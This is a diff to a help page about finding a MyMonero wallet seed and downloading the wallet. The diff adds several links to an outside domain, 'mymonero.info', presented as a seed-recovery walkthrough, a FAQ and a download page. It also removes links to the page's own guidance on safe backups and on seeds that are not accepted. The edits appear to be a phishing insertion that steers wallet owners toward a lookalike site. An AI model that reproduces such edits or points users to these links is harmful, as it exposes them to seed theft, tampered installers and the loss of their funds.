@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Your MyMonero seed is the recovery phrase created when the wallet was set up, not a phrase that can be retrieved from a MyMonero account online. Look for your own private backup; never share the phrase with anyone.
 
+
+For a second walkthrough, see [MyMonero find seed on mymonero.info](https://mymonero.info/find-mymonero-seed). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).
+
 ## You'll see this if
 - You want to restore a wallet on another device or in another supported wallet.
 - You can open the old app but do not remember where you wrote down the seed.
@@ -51,12 +54,12 @@ If no backup turns up, do not assume a hosted service can provide one. MyMonero 
 
 If the app is still accessible, look for its own local backup or wallet-management options, and take care not to erase the installation before understanding the consequences. Avoid reinstalling, resetting, or deleting wallet data as a first troubleshooting step. Data-folder locations are not specified here, so do not follow generic path instructions unless verified for your system and version. If the app will not open, retain the device and any existing backups while seeking general technical guidance that does not require disclosing secrets.
 
-If you have an incomplete phrase, offline recovery of a missing word is not confirmed. Do not submit partial words to online tools or strangers. Preserve what you have, review your own backup sources, and avoid repeated guesses in unfamiliar software. If you do find a complete phrase, learn [what to do when a seed is not accepted](./mymonero-seed-not-accepted.md) before attempting restore.
+If you have an incomplete phrase, offline recovery of a missing word is not confirmed. Do not submit partial words to online tools or strangers. Preserve what you have, review your own backup sources, and avoid repeated guesses in unfamiliar software. If you do find a complete phrase, learn what to do when a seed is not accepted before attempting restore.
 
 ## Prevention
 Once you have access, create a durable offline backup and verify that you can read it. Keep it private and protected from loss, damage, and unauthorized access. Avoid storing a plain-text copy in email, cloud notes, screenshots, or a shared document. Consider keeping more than one physical backup in secure, separate places, while making sure each copy remains under your control.
 
-Keep seed, password, and private keys clearly distinguished in your own records. Label the wallet and date without including sensitive words on an exposed label. Never enter a seed to “check” a download: software integrity uses a SHA-256 comparison, not wallet secrets. See [safe backup guidance](./mymonero-backup-seed-safely.md), [private view and spend keys](./mymonero-private-view-spend-keys.md), and download verification.
+Keep seed, password, and private keys clearly distinguished in your own records. Label the wallet and date without including sensitive words on an exposed label. Never enter a seed to “check” a download: software integrity uses a SHA-256 comparison, not wallet secrets. See safe backup guidance, private view and spend keys, and download verification.
 
 ## FAQ
 <details><summary>Can MyMonero send my seed to me?</summary>
@@ -87,6 +90,7 @@ Never share it for verification. Nobody legitimate asks for your seed; enter it 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
